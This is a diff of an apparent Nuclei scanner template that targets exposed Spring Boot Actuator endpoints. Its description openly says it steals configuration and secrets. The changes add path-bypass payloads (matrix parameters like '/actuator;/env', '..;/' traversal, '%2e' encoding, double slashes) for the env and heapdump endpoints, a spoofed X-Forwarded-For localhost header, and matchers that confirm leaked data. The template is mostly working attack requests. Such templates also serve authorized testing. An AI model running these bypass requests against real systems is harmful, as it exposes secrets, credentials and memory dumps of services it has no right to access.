@@ -1,22 +1,28 @@
 id: ghost-actuator-leak
 
 info:
-  name: Spring Boot / Microservices Actuator Exposure
+  name: Spring Boot Actuator Exposure (Matrix Bypass Edition)
   author: Sniper-Predator
   severity: critical
-  description: Mencuri konfigurasi environment dan secret dari Actuator yang terekspos.
-  tags: exposure,config,actuator,springboot,custom
+  description: Mencuri konfigurasi Spring Boot menggunakan Matrix Parameters Bypass.
+  tags: exposure,config,actuator,springboot,bypass,custom
 
 requests:
   - method: GET
     path:
+      # Standard
       - "{{BaseURL}}/actuator/env"
-      - "{{BaseURL}}/env"
-      - "{{BaseURL}}/api/actuator/env"
-      - "{{BaseURL}}/management/env"
       - "{{BaseURL}}/actuator/heapdump"
+      # Spring Boot Matrix/Proxy Bypasses (The Lethal Injection)
+      - "{{BaseURL}}/actuator;/env"
+      - "{{BaseURL}}/actuator;/heapdump"
+      - "{{BaseURL}}/api/..;/actuator/env"
+      - "{{BaseURL}}/%2e/actuator/env"
+      - "{{BaseURL}}//actuator/env"
+      - "{{BaseURL}}/actuator/env.json"
+      - "{{BaseURL}}/actuator/gateway/routes"
     headers:
-      Accept: "application/json"
+      Accept: "application/json, application/vnd.spring-boot.actuator.v3+json"
       X-Forwarded-For: "127.0.0.1"
 
     matchers-condition: and
@@ -29,8 +35,9 @@ requests:
           - "activeProfiles"
           - "propertySources"
           - "management.endpoints"
+          - "route_id"
         condition: or
-      # ANTI-HTML TRAP: Actuator asli SELALU JSON, bukan HTML.
+      # ANTI-HTML TRAP
       - type: word
         words:
           - "<html"
